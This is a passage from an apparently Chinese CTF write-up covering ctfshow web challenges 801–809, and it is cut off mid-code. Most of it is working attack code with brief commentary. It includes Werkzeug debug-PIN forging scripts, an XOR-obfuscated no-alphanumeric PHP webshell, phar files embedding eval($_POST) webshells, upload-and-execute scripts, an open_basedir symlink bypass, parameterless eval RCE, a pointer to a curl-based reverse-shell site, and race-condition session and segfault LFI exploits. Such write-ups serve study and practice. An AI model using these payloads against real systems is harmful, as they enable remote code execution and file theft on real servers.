<span class="title function_">hello</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Welcome to ctfshow file download system, use /file?filename= to download file,my debug mode is enable.&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/file&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">file</span>():</span><br><span class="line">    filename = request.args.get(<span class="string">&#x27;filename&#x27;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">80</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>读相关文件算pin码即可，记录一下可行的脚本</p><p>md5</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> getpass</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line">username=getpass.getuser() </span><br><span class="line">app = Flask(__name__)</span><br><span class="line">modname=<span class="built_in">getattr</span>(app, <span class="string">&quot;__module__&quot;</span>, app.__class__.__module__)</span><br><span class="line">mod = sys.modules.get(modname)</span><br><span class="line"></span><br><span class="line">probably_public_bits = [</span><br><span class="line">    username, <span class="comment">#用户名 一般为root或者读下/etc/passwd</span></span><br><span class="line">    modname,  <span class="comment">#一般固定为flask.app</span></span><br><span class="line">    <span class="built_in">getattr</span>(app, <span class="string">&quot;__name__&quot;</span>, app.__class__.__name__), <span class="comment">#固定，一般为Flask</span></span><br><span class="line">    <span class="built_in">getattr</span>(mod, <span class="string">&quot;__file__&quot;</span>, <span class="literal">None</span>),    <span class="comment">#flask库下app.py的绝对路径，可以通过报错信息得到</span></span><br><span class="line">]</span><br><span class="line">mac =<span class="string">&#x27;02:42:ac:0c:ac:28&#x27;</span>.replace(<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">mac=<span class="built_in">str</span>(<span class="built_in">int</span>(mac,base=<span class="number">16</span>))</span><br><span class="line">private_bits = [</span><br><span class="line">mac,</span><br><span class="line"> <span class="string">&quot;机器码&quot;</span></span><br><span class="line"> ]</span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&quot;cookiesalt&quot;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&quot;__wzd&quot;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># If we need to generate a pin we salt it a bit more so that we don&#x27;t</span></span><br><span class="line"><span class="comment"># end up with the same value and generate out 9 digits</span></span><br><span class="line">num=<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&quot;pinsalt&quot;</span>)</span><br><span class="line">    num = (<span class="string">&quot;%09d&quot;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Format the pincode in groups of digits for easier remembering if</span></span><br><span class="line"><span class="comment"># we don&#x27;t have a result yet.</span></span><br><span class="line">rv=<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&quot;-&quot;</span>.join(</span><br><span class="line">                num[x : x + group_size].rjust(group_size, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">                <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size)</span><br><span class="line">            )</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line">    <span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure><p>sha1:py38适用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> getpass</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> typing <span class="keyword">as</span> t</span><br><span class="line">username=<span class="string">&#x27;root&#x27;</span></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">modname=<span class="built_in">getattr</span>(app, <span class="string">&quot;__module__&quot;</span>, t.cast(<span class="built_in">object</span>, app).__class__.__module__)</span><br><span class="line">mod=sys.modules.get(modname)</span><br><span class="line">mod = <span class="built_in">getattr</span>(mod, <span class="string">&quot;__file__&quot;</span>, <span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line">probably_public_bits = [</span><br><span class="line">    username, <span class="comment">#用户名</span></span><br><span class="line">    modname,  <span class="comment">#一般固定为flask.app</span></span><br><span class="line">    <span class="built_in">getattr</span>(app, <span class="string">&quot;__name__&quot;</span>, app.__class__.__name__), <span class="comment">#固定，一般为Flask</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.8/site-packages/flask/app.py&#x27;</span>,   <span class="comment">#主程序（app.py）运行的绝对路径</span></span><br><span class="line">]</span><br><span class="line"><span class="built_in">print</span>(probably_public_bits)</span><br><span class="line">mac =<span class="string">&#x27;02:42:ac:0c:ac:28&#x27;</span>.replace(<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">mac=<span class="built_in">str</span>(<span class="built_in">int</span>(mac,base=<span class="number">16</span>))</span><br><span class="line">private_bits = [</span><br><span class="line">   mac,<span class="comment">#mac地址十进制</span></span><br><span class="line"> <span class="string">&quot;机器码&quot;</span></span><br><span class="line">     ]</span><br><span class="line"><span class="built_in">print</span>(private_bits)</span><br><span class="line">h = hashlib.sha1()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&quot;cookiesalt&quot;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">f&quot;__wzd<span class="subst">&#123;h.hexdigest()[:<span class="number">20</span>]&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># If we need to generate a pin we salt it a bit more so that we don&#x27;t</span></span><br><span class="line"><span class="comment"># end up with the same value and generate out 9 digits</span></span><br><span class="line">h.update(<span class="string">b&quot;pinsalt&quot;</span>)</span><br><span class="line">num = <span class="string">f&quot;<span class="subst">&#123;<span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>):09d&#125;</span>&quot;</span>[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Format the pincode in groups of digits for easier remembering if</span></span><br><span class="line"><span class="comment"># we don&#x27;t have a result yet.</span></span><br><span class="line">rv=<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&quot;-&quot;</span>.join(</span><br><span class="line">                num[x : x + group_size].rjust(group_size, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">                <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size)</span><br><span class="line">            )</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure><p>需要填的值就一个变化的地方—机器码。旧版的只需要读取&#x2F;proc&#x2F;self&#x2F;cgroup即可，但是新增需要在前面再拼上&#x2F;etc&#x2F;machine-id或者&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_id的值</p><h1 id="web802-无字母数字webshell"><a href="#web802-无字母数字webshell" class="headerlink" title="web802 无字母数字webshell"></a>web802 无字母数字webshell</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="string">&quot;%13%19%13%14%05%0d&quot;</span>^<span class="string">&quot;%60%60%60%60%60%60&quot;</span>)(<span class="string">&quot;%03%01%14%00%06%0c%01%07%00%10%08%10&quot;</span>^<span class="string">&quot;%60%60%60%20%60%60%60%60%2e%60%60%60&quot;</span>);</span><br></pre></td></tr></table></figure><p>直接构造异或拼接，其他方式有很多很多</p><h1 id="web803-phar"><a href="#web803-phar" class="headerlink" title="web803 phar"></a>web803 phar</h1><p>生成phar:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;&lt;?php eval(\$_POST[1]);&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>上传&amp;getshell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">data1 = &#123;</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;/tmp/1.phar&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;content&#x27;</span>:<span class="built_in">open</span>(<span class="string">&#x27;./1.phar&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">data2 = &#123;</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;phar:///tmp/1.phar/test&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;content&#x27;</span>:<span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1&#x27;</span>:<span class="string">&quot;echo system(&#x27;tac f*&#x27;);&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://8dff98b5-c424-42b0-80f2-8cd67b9d0866.challenge.ctf.show/index.php&quot;</span></span><br><span class="line"></span><br><span class="line">r1 = requests.post(url=url,data=data1)</span><br><span class="line"><span class="built_in">print</span>(r1.text)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">r2 = requests.post(url=url,data=data2)</span><br><span class="line"><span class="built_in">print</span>(r2.text)</span><br></pre></td></tr></table></figure><h1 id="web805-反序列化"><a href="#web805-反序列化" class="headerlink" title="web805 反序列化"></a>web805 反序列化</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hacker</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span> = <span class="string">&quot;echo system(&#x27;cat f*&#x27;);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> <span class="title function_ invoke__">hacker</span>();</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//将自定义meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;&lt;?php eval(\$_POST[1]);&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">data1 = &#123;</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;/tmp/1.phar&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;content&#x27;</span>:<span class="built_in">open</span>(<span class="string">&#x27;./1.phar&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">data2 = &#123;</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;phar:///tmp/1.phar/test&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;content&#x27;</span>:<span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://f41ee967-9ea2-44a4-a865-34628612de63.challenge.ctf.show/index.php&quot;</span></span><br><span class="line"></span><br><span class="line">r1 = requests.post(url=url,data=data1)</span><br><span class="line"><span class="built_in">print</span>(r1.text)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">r2 = requests.post(url=url,data=data2)</span><br><span class="line"><span class="built_in">print</span>(r2.text)</span><br></pre></td></tr></table></figure><h1 id="web804-绕过open-base-dir"><a href="#web804-绕过open-base-dir" class="headerlink" title="web804 绕过open_base_dir"></a>web804 绕过open_base_dir</h1><p>写入1，然后直接下载即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">mkdir(<span class="string">&quot;A&quot;</span>);</span><br><span class="line">chdir(<span class="string">&quot;A&quot;</span>);</span><br><span class="line">mkdir(<span class="string">&quot;B&quot;</span>);</span><br><span class="line">chdir(<span class="string">&quot;B&quot;</span>);</span><br><span class="line">mkdir(<span class="string">&quot;C&quot;</span>);</span><br><span class="line">chdir(<span class="string">&quot;C&quot;</span>);</span><br><span class="line">mkdir(<span class="string">&quot;D&quot;</span>);</span><br><span class="line">chdir(<span class="string">&quot;D&quot;</span>);</span><br><span class="line">chdir(<span class="string">&quot;..&quot;</span>);</span><br><span class="line">chdir(<span class="string">&quot;..&quot;</span>);</span><br><span class="line">chdir(<span class="string">&quot;..&quot;</span>);</span><br><span class="line">chdir(<span class="string">&quot;..&quot;</span>);</span><br><span class="line">symlink(<span class="string">&quot;A/B/C/D&quot;</span>,<span class="string">&quot;SD&quot;</span>);</span><br><span class="line">symlink(<span class="string">&quot;SD/../../../../ctfshowflag&quot;</span>,<span class="string">&quot;1&quot;</span>);</span><br><span class="line">unlink(<span class="string">&quot;SD&quot;</span>);</span><br><span class="line">mkdir(<span class="string">&quot;SD&quot;</span>);</span><br></pre></td></tr></table></figure><h1 id="web806-php无参rce"><a href="#web806-php无参rce" class="headerlink" title="web806 php无参rce"></a>web806 php无参rce</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?code=<span class="built_in">eval</span>(array_pop(<span class="built_in">next</span>(get_defined_vars())));</span><br><span class="line">post直接可以rce</span><br></pre></td></tr></table></figure><h1 id="web807-反弹shell"><a href="#web807-反弹shell" class="headerlink" title="web807 反弹shell"></a>web807 反弹shell</h1><p>群主的网站，只要curl就能弹shell：<a href="https://your-shell.com/">https://your-shell.com/</a></p><p>这道题貌似只能curl</p><h1 id="web808-php7-0-Segfault-LFI-or-php-session-LFI"><a href="#web808-php7-0-Segfault-LFI-or-php-session-LFI" class="headerlink" title="web808 php7.0 Segfault LFI or php session LFI"></a>web808 php7.0 <strong>Segfault</strong> LFI or php session LFI</h1><h3 id="解法1："><a href="#解法1：" class="headerlink" title="解法1："></a>解法1：</h3><p>php线程崩溃导致临时文件被保存</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>) &amp;&amp; !<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/input|data|phar|log/i&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&quot;/tmp&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re </span><br><span class="line">url = <span class="string">&quot;http://13d3ac5b-6c38-41c9-9364-ada319d284d3.challenge.ctf.show/&quot;</span></span><br><span class="line">file=&#123;</span><br><span class="line"><span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;&lt;?php system(&quot;cat /*&quot;);?&gt;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">requests.post(url+<span class="string">&#x27;?file=php://filter/string.strip_tags/resource=/etc/passwd&#x27;</span>,files=file)</span><br><span class="line">r=requests.get(url)</span><br><span class="line"></span><br><span class="line">tmp=re.findall(<span class="string">&#x27;=&gt; (php.*?)\\n&#x27;</span>,r.text,re.S)[-<span class="number">1</span>]</span><br><span class="line">r=requests.get(url+<span class="string">&#x27;?file=/tmp/&#x27;</span>+tmp)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><p>核心是<code>?file=php://filter/string.strip_tags/resource=/etc/passwd</code>会让php的线程崩溃</p><h3 id="解法2："><a href="#解法2：" class="headerlink" title="解法2："></a>解法2：</h3><p>包含session</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">session=requests.session()</span><br><span class="line">sess=<span class="string">&#x27;flag&#x27;</span></span><br><span class="line">url1=<span class="string">&quot;http://13d3ac5b-6c38-41c9-9364-ada319d284d3.challenge.ctf.show/&quot;</span></span><br><span class="line">url2=<span class="string">&#x27;http://13d3ac5b-6c38-41c9-9364-ada319d284d3.challenge.ctf.show/?file=/tmp/sess_flag&#x27;</span></span><br><span class="line">data1=&#123;</span><br><span class="line">    <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:<span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">data2=&#123;</span><br><span class="line">    <span class="string">&#x27;1&#x27;</span>:<span class="string">&#x27;echo 11123;system(&quot;cat /f*&quot;);&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line">file=&#123;</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;1&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">cookies=&#123;</span><br><span class="line">    <span class="string">&#x27;PHPSESSID&#x27;</span>: sess</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        r = session.post(url1,data=data1,files=file,cookies=cookies)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        r = session.post(url2,data=data2)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;11123&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    event=threading.Event()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=write).start()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=read).start()</span><br><span class="line">    event.<span class="built_in">set</span>()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web809-pear文件包含-x2F-RCE"><a href="#web809-pear文件包含-x2F-RCE" class="headerlink" title="web809 pear文件包含&#x2F;RCE"></a>web809 pear文件包含&#x2F;RCE</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span 